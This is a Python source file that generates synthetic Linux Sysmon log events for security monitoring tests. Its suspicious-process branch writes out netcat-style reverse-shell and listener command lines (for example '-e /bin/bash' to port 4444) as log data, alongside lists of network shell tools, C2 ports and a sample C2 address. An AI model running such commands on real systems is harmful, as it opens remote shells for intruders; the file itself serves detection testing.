#!/usr/bin/env python3
"""
Linux Sysmon (sysmonforlinux) Log Generator
https://github.com/Sysinternals/SysmonForLinux

Linux Sysmon uses eBPF to provide similar capabilities to Windows Sysmon:
- Process creation/termination monitoring
- Network connection tracking
- File creation/deletion monitoring
- Raw disk access detection

This generator produces logs compatible with Linux Sysmon output format.
"""

import json
import random
import uuid
from datetime import datetime, timezone
from typing import Dict, List, Any, Optional
try:
    from ..base import BaseGenerator
    from ...core import LogEvent, EventSeverity, AssetInventory
except (ImportError, ValueError):
    from generators.base import BaseGenerator
    from core import LogEvent, EventSeverity, AssetInventory


class LinuxSysmonGenerator(BaseGenerator):
    """
    Generator for Linux Sysmon (sysmonforlinux) events.
    
    Linux Sysmon is Microsoft's official port of Sysmon to Linux using eBPF.
    It provides cross-platform process and network monitoring capabilities.
    
    Reference: https://github.com/Sysinternals/SysmonForLinux
    """
    
    # Linux Sysmon supported events (as of v1.3)
    # Note: Linux Sysmon has fewer events than Windows due to platform differences
    EVENT_TYPES = {
        1: ("ProcessCreate", "Process creation", EventSeverity.LOW),
        3: ("NetworkConnect", "Network connection detected", EventSeverity.LOW),
        5: ("ProcessTerminate", "Process terminated", EventSeverity.LOW),
        9: ("RawAccessRead", "Raw access read detected", EventSeverity.HIGH),
        11: ("FileCreate", "File created", EventSeverity.LOW),
        16: ("SysmonConfigChange", "Sysmon config state changed", EventSeverity.MEDIUM),
        23: ("FileDelete", "File deleted (archived)", EventSeverity.LOW),
    }
    
    # Common Linux processes
    COMMON_PROCESSES = [
        ("/usr/sbin/sshd", "sshd", "root"),
        ("/usr/bin/python3", "python3", "user"),
        ("/usr/bin/curl", "curl", "user"),
        ("/usr/bin/wget", "wget", "user"),
        ("/usr/bin/apt", "apt", "root"),
        ("/usr/bin/systemctl", "systemctl", "root"),
        ("/usr/bin/dockerd", "dockerd", "root"),
        ("/usr/sbin/apache2", "apache2", "www-data"),
        ("/usr/sbin/nginx", "nginx", "nginx"),
        ("/usr/bin/bash", "bash", "user"),
        ("/bin/sh", "sh", "user"),
        ("/usr/bin/ls", "ls", "user"),
        ("/usr/bin/cat", "cat", "user"),
        ("/usr/bin/grep", "grep", "user"),
        ("/usr/bin/awk", "awk", "user"),
        ("/usr/bin/sed", "sed", "user"),
        ("/usr/bin/ssh", "ssh", "user"),
        ("/usr/bin/scp", "scp", "user"),
        ("/usr/bin/rsync", "rsync", "user"),
        ("/usr/bin/tar", "tar", "user"),
        ("/usr/bin/gzip", "gzip", "user"),
        ("/usr/bin/mysql", "mysql", "mysql"),
        ("/usr/bin/psql", "psql", "postgres"),
        ("/usr/bin/redis-cli", "redis-cli", "redis"),
    ]
    
    # Suspicious/interesting processes for security scenarios
    SUSPICIOUS_PROCESSES = [
        ("/usr/bin/nc", "nc", "user"),
        ("/usr/bin/netcat", "netcat", "user"),
        ("/usr/bin/ncat", "ncat", "user"),
        ("/usr/bin/nmap", "nmap", "user"),
        ("/usr/sbin/tcpdump", "tcpdump", "root"),
        ("/usr/bin/wireshark", "wireshark", "user"),
        ("/usr/bin/strace", "strace", "root"),
        ("/usr/bin/ltrace", "ltrace", "root"),
        ("/usr/bin/ldd", "ldd", "user"),
        ("/usr/bin/objdump", "objdump", "user"),
        ("/usr/bin/readelf", "readelf", "user"),
        ("/usr/sbin/chroot", "chroot", "root"),
        ("/usr/bin/socat", "socat", "user"),
        ("/usr/bin/telnet", "telnet", "user"),
    ]
    
    # Network destinations for connection events
    NETWORK_DESTINATIONS = [
        # Internal
        ("10.0.10.10", 22, "tcp"),
        ("10.0.10.10", 80, "tcp"),
        ("10.0.20.20", 3306, "tcp"),
        ("10.0.20.20", 5432, "tcp"),
        ("10.0.30.5", 53, "udp"),
        # External
        ("8.8.8.8", 53, "udp"),
        ("1.1.1.1", 53, "udp"),
        ("13.107.42.14", 443, "tcp"),
        ("140.82.121.4", 443, "tcp"),  # GitHub
        ("185.220.101.42", 443, "tcp"),  # Example C2
    ]
    
    def __init__(self, config: Dict[str, Any], inventory: AssetInventory):
        super().__init__(config)
        self.inventory = inventory
        self.event_weights = config.get('event_weights', [40, 25, 10, 5, 15, 1, 4])
        
    def _get_random_linux_asset(self) -> Dict:
        """Get a random Linux server asset."""
        servers = {k: v for k, v in self.inventory.assets.items() 
                  if v.get("type") == "server" and "Linux" in v.get("os", "")}
        if not servers:
            return {"hostname": "SRV-LNX-001", "ip": "10.0.20.11"}
        hostname = random.choice(list(servers.keys()))
        asset = servers[hostname].copy()
        asset["hostname"] = hostname
        return asset
    
    def _generate_process_guid(self) -> str:
        """Generate a Sysmon-style process GUID."""
        return "{" + str(uuid.uuid4()).upper() + "}"
    
    def _calculate_hashes(self, image_path: str) -> str:
        """Generate fake hash values for process images."""
        md5 = ''.join([random.choice('0123456789abcdef') for _ in range(32)])
        sha256 = ''.join([random.choice('0123456789abcdef') for _ in range(64)])
        return f"MD5={md5.upper()},SHA256={sha256.upper()}"
    
    def _generate_process_create_event(self) -> LogEvent:
        """Generate Event ID 1: ProcessCreate."""
        asset = self._get_random_linux_asset()
        user = self.inventory.get_random_user()
        timestamp = datetime.now(timezone.utc)
        
        # Determine if suspicious
        is_suspicious = random.random() < 0.05  # 5% suspicious
        
        if is_suspicious:
            image, proc_name, default_user = random.choice(self.SUSPICIOUS_PROCESSES)
            severity = EventSeverity.HIGH
            tags = ["linux", "sysmon", "process_create", "suspicious"]
            
            # Suspicious command lines
            cmd_lines = [
                f"{image} -e /bin/bash 192.168.1.100 4444",
                f"{image} -lvnp 4444",
                f"{image} /bin/bash",
                f"{image} -i",
            ]
            cmd_line = random.choice(cmd_lines)
        else:
            image, proc_name, default_user = random.choice(self.COMMON_PROCESSES)
            severity = EventSeverity.LOW
            tags = ["linux", "sysmon", "process_create"]
            cmd_line = image
        
        process_guid = self._generate_process_guid()
        parent_guid = self._generate_process_guid()
        pid = random.randint(1000, 65535)
        ppid = random.randint(1, 9999)
        
        fields = {
            "EventType": "ProcessCreate",
            "EventId": 1,
            "RuleName": f"technique_id=T1059,technique_name=Command-Line Interface",
            "UtcTime": timestamp.strftime("%Y-%m-%d %H:%M:%S.%f"),
            "ProcessGuid": process_guid,
            "ProcessId": pid,
            "Image": image,
            "CommandLine": cmd_line,
            "CurrentDirectory": f"/home/{user['username']}" if user['role'] != 'admin' else "/root",
            "User": f"{user['domain']}\\{user['username']}" if user['domain'] != 'corp.local' else user['username'],
            "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
            "LogonId": random.randint(1000, 99999),
            "TerminalSessionId": random.randint(1, 10),
            "IntegrityLevel": "no level",  # Linux doesn't use Windows integrity levels
            "Hashes": self._calculate_hashes(image),
            "ParentProcessGuid": parent_guid,
            "ParentProcessId": ppid,
            "ParentImage": "/bin/bash" if proc_name != "bash" else "/usr/sbin/sshd",
            "ParentCommandLine": "bash" if proc_name != "bash" else "/usr/sbin/sshd -D",
            "ParentUser": user['username'],
        }
        
        # Sysmon for Linux log format (structured)
        msg = f"Process Create: {image} (PID: {pid}) by user {user['username']}"
        
        return LogEvent(
            timestamp=timestamp,
            source_type="linux_sysmon",
            source_ip=asset["ip"],
            source_host=asset["hostname"],
            message=msg,
            raw_log=json.dumps({
                "EventTime": timestamp.isoformat(),
                "EventType": "ProcessCreate",
                "EventId": 1,
                **fields
            }),
            fields=fields,
            tags=tags,
            severity=severity
        )
    
    def _generate_network_connect_event(self) -> LogEvent:
        """Generate Event ID 3: NetworkConnect."""
        asset = self._get_random_linux_asset()
        user = self.inventory.get_random_user()
        timestamp = datetime.now(timezone.utc)
        
        process_guid = self._generate_process_guid()
        image, proc_name, _ = random.choice(self.COMMON_PROCESSES)
        
        # Choose destination
        if random.random() < 0.7:  # 70% internal
            dst_ip = f"10.0.{random.randint(10, 30)}.{random.randint(1, 254)}"
            dst_port = random.choice([22, 80, 443, 3306, 5432, 6379, 8080])
        else:  # 30% external
            dst_ip, dst_port, proto = random.choice(self.NETWORK_DESTINATIONS[-5:])
            proto = "tcp"
        
        src_port = random.randint(32768, 60999)
        protocol = "tcp" if dst_port in [22, 80, 443, 3306, 5432, 8080] else "udp"
        
        # Check for suspicious connection
        is_suspicious = (
            dst_port in [4444, 5555, 6666, 9999] or  # Common C2 ports
            "192.42.116" in dst_ip or  # Tor exit node example
            proc_name in ["nc", "netcat", "ncat"]
        )
        
        severity = EventSeverity.HIGH if is_suspicious else EventSeverity.LOW
        tags = ["linux", "sysmon", "network_connect"]
        if is_suspicious:
            tags.append("suspicious")
        
        fields = {
            "EventType": "NetworkConnect",
            "EventId": 3,
            "RuleName": "",
            "UtcTime": timestamp.strftime("%Y-%m-%d %H:%M:%S.%f"),
            "ProcessGuid": process_guid,
            "ProcessId": random.randint(1000, 65535),
            "Image": image,
            "User": user['username'],
            "Protocol": protocol,
            "Initiated": True,
            "SourceIsIpv6": False,
            "SourceIp": asset["ip"],
            "SourceHostname": asset["hostname"],
            "SourcePort": src_port,
            "DestinationIsIpv6": False,
            "DestinationIp": dst_ip,
            "DestinationHostname": "",
            "DestinationPort": dst_port,
        }
        
        msg = f"Network connection: {image} -> {dst_ip}:{dst_port} ({protocol})"
        
        return LogEvent(
            timestamp=timestamp,
            source_type="linux_sysmon",
            source_ip=asset["ip"],
            source_host=asset["hostname"],
            message=msg,
            raw_log=json.dumps({
                "EventTime": timestamp.isoformat(),
                "EventType": "NetworkConnect",
                "EventId": 3,
                **fields
            }),
            fields=fields,
            tags=tags,
            severity=severity
        )
    
    def _generate_file_create_event(self) -> LogEvent:
        """Generate Event ID 11: FileCreate."""
        asset = self._get_random_linux_asset()
        user = self.inventory.get_random_user()
        timestamp = datetime.now(timezone.utc)
        
        process_guid = self._generate_process_guid()
        image, proc_name, _ = random.choice(self.COMMON_PROCESSES)
        
        # Common file paths
        file_paths = [
            f"/home/{user['username']}/.bashrc",
            f"/home/{user['username']}/.ssh/authorized_keys",
            f"/home/{user['username']}/documents/report.pdf",
            f"/tmp/tmp.{random.randint(100000, 999999)}",
            "/var/log/syslog",
            "/var/log/auth.log",
            "/etc/crontab",
            f"/opt/app/logs/app.{timestamp.strftime('%Y%m%d')}.log",
        ]
        
        target_filename = random.choice(file_paths)
        
        # Suspicious file creation checks
        is_suspicious = (
            "/.ssh/authorized_keys" in target_filename or
            "/tmp/." in target_filename or
            target_filename.endswith((".sh", ".py", ".pl")) and random.random() < 0.3
        )
        
        severity = EventSeverity.MEDIUM if is_suspicious else EventSeverity.LOW
        tags = ["linux", "sysmon", "file_create"]
        if is_suspicious:
            tags.append("suspicious")
        
        fields = {
            "EventType": "FileCreate",
            "EventId": 11,
            "RuleName": "",
            "UtcTime": timestamp.strftime("%Y-%m-%d %H:%M:%S.%f"),
            "ProcessGuid": process_guid,
            "ProcessId": random.randint(1000, 65535),
            "Image": image,
            "TargetFilename": target_filename,
            "CreationUtcTime": timestamp.strftime("%Y-%m-%d %H:%M:%S.%f"),
            "User": user['username'],
        }
        
        msg = f"File created: {target_filename} by {image}"
        
        return LogEvent(
            timestamp=timestamp,
            source_type="linux_sysmon",
            source_ip=asset["ip"],
            source_host=asset["hostname"],
            message=msg,
            raw_log=json.dumps({
                "EventTime": timestamp.isoformat(),
                "EventType": "FileCreate",
                "EventId": 11,
                **fields
            }),
            fields=fields,
            tags=tags,
            severity=severity
        )
    
    def _generate_raw_access_read_event(self) -> LogEvent:
        """Generate Event ID 9: RawAccessRead (rare, high severity)."""
        asset = self._get_random_linux_asset()
        user = self.inventory.get_random_user()
        timestamp = datetime.now(timezone.utc)
        
        process_guid = self._generate_process_guid()
        
        # Only certain tools do raw disk access
        tools = ["/usr/bin/dd", "/usr/sbin/debugfs", "/usr/bin/hexedit", "/sbin/fsck"]
        image = random.choice(tools)
        
        fields = {
            "EventType": "RawAccessRead",
            "EventId": 9,
            "RuleName": "technique_id=T1003,technique_name=OS Credential Dumping",
            "UtcTime": timestamp.strftime("%Y-%m-%d %H:%M:%S.%f"),
            "ProcessGuid": process_guid,
            "ProcessId": random.randint(1000, 65535),
            "Image": image,
            "Device": f"/dev/sd{random.choice('abcd')}{random.randint(1, 4)}",
            "User": user['username'],
        }
        
        msg = f"Raw disk access: {image} reading {fields['Device']}"
        
        return LogEvent(
            timestamp=timestamp,
            source_type="linux_sysmon",
            source_ip=asset["ip"],
            source_host=asset["hostname"],
            message=msg,
            raw_log=json.dumps({
                "EventTime": timestamp.isoformat(),
                "EventType": "RawAccessRead",
                "EventId": 9,
                **fields
            }),
            fields=fields,
            tags=["linux", "sysmon", "raw_access", "credential_dumping"],
            severity=EventSeverity.HIGH
        )
    
    def generate_event(self) -> LogEvent:
        """Generate a Linux Sysmon event based on configured weights."""
        event_id = random.choices(
            list(self.EVENT_TYPES.keys()),
            weights=self.event_weights
        )[0]
        
        if event_id == 1:
            return self._generate_process_create_event()
        elif event_id == 3:
            return self._generate_network_connect_event()
        elif event_id == 9:
            return self._generate_raw_access_read_event()
        elif event_id == 11:
            return self._generate_file_create_event()
        else:
            # Default to process create for unimplemented events
            return self._generate_process_create_event()
